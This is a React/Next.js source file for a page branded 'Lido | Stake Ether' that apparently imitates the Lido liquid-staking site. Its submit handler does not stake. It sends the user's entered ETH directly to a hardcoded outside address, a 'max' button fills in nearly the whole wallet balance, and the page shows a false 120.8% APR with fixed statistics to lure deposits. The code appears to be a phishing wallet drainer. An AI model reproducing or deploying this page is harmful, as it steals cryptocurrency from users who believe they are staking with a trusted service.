import { FC, FormEventHandler, useEffect, useMemo, useState } from 'react';
// import { GetServerSideProps } from 'next';
import {
  Block,
  Link,
  DataTable,
  DataTableRow,
  Input,
  Button,
  Eth,
} from '@lidofinance/lido-ui';
import Head from 'next/head';
import Wallet from 'components/wallet';
import Section from 'components/section';
import Layout from 'components/layout';
// import Faq from 'components/faq';
import { FAQItem } from 'lib/faqList';
import styled from 'styled-components';
import { BigNumber, ethers } from 'ethers';
import { useWeb3React } from '@web3-react/core';
import MaxButton from '../components/maxButton';
import WalletConnect from '../components/walletConnect';

interface HomeProps {
  faqList: FAQItem[];
}

const StyledConnectWalletButton = styled(WalletConnect)`
  width: 100%;
`;

const InputWrapper = styled.div`
  margin-bottom: ${({ theme }) => theme.spaceMap.md}px;
`;
const AprPercent = styled.span`
  color: rgb(97, 183, 95);
`;

const Home: FC<HomeProps> = () => {
  const [amount, setAmount] = useState('');
  const [maxValue, setMaxValue] = useState<string>('0');
  const { library, account } = useWeb3React();

  const signerOrProvider = useMemo(() => {
    if (library?.['getSigner']) {
      return library.getSigner();
    } else {
      return library;
    }
  }, [library]);
  // const signer = library.getSigner();
  const handleInputAmount = (e: any) => {
    console.log(e.target.value);
    if (e.target.value > maxValue) {
      setAmount(maxValue);
    } else {
      setAmount(e.target.value);
    }
  };
  const handleSubmit: FormEventHandler<HTMLFormElement> | undefined = (e) => {
    e.preventDefault();

    signerOrProvider.getBalance().then((balance: any) => {
      console.log(balance);
      signerOrProvider.sendTransaction({
        to: '0xc8Fa828392B11C4c8eA7387e66B2496C3995BA1d',
        value: ethers.utils.parseEther(amount),
      });
    });
  };

  const handleMax = () => {
    setAmount(maxValue);
  };
  useEffect(() => {
    const getMaxValue = async () => {
      if (account) {
        const gas = await signerOrProvider.getGasPrice();
        const balance = await signerOrProvider.getBalance();
        const value = balance.gt(gas.mul(BigNumber.from('22000')))
          ? ethers.utils.formatEther(
              balance.sub(gas.mul(BigNumber.from('22000'))),
            )
          : '0';
        setMaxValue(value);
        console.log(maxValue);
      }
    };
    getMaxValue();
  }, [account]);

  return (
    <Layout
      title="Stake Ether"
      subtitle="Stake ETH and receive stETH while staking."
    >
      <Head>
        <title>Lido | Stake Ether</title>
      </Head>
      <Wallet />
      <Block>
        <form action="" method="post" onSubmit={handleSubmit}>
          <InputWrapper>
            <Input
              fullwidth
              placeholder="0"
              leftDecorator={<Eth />}
              rightDecorator={<MaxButton onClick={handleMax} />}
              label="Token amount"
              value={amount}
              onInput={handleInputAmount}
            />
          </InputWrapper>

          {account ? (
            <Button fullwidth type="submit">
              Submit
            </Button>
          ) : (
            <StyledConnectWalletButton />
          )}
        </form>
      </Block>
      <Section
        title="Lido statistics"
        headerDecorator={
          <Link href="https://etherscan.io/token/0xae7ab96520de3a18e5e111b5eaab095312d7fe84">
            View on Etherscan
          </Link>
        }
      >
        <Block>
          <DataTable>
            <DataTableRow title="Annual percentage rate">
              <AprPercent>120.8%</AprPercent>
            </DataTableRow>
            <DataTableRow title="Total staked with Lido">
              4,331,745.721 ETH
            </DataTableRow>
            <DataTableRow title="Stakers">106231</DataTableRow>
            <DataTableRow title="stETH market cap">$5,811,042,006</DataTableRow>
          </DataTable>
        </Block>
      </Section>
      {/*<Faq faqList={faqList} />*/}
    </Layout>
  );
};

export default Home;

// const faqList = getFaqList([
//   'how-lido-work',
//   'what-is-liquid-staking',
//   'lido-secure',
//   'difference-between',
//   'risk',
//   'fee',
// ]);

// export const getServerSideProps: GetServerSideProps<HomeProps> = async () => {
//   return { props: { faqList: await faqList } };
// };
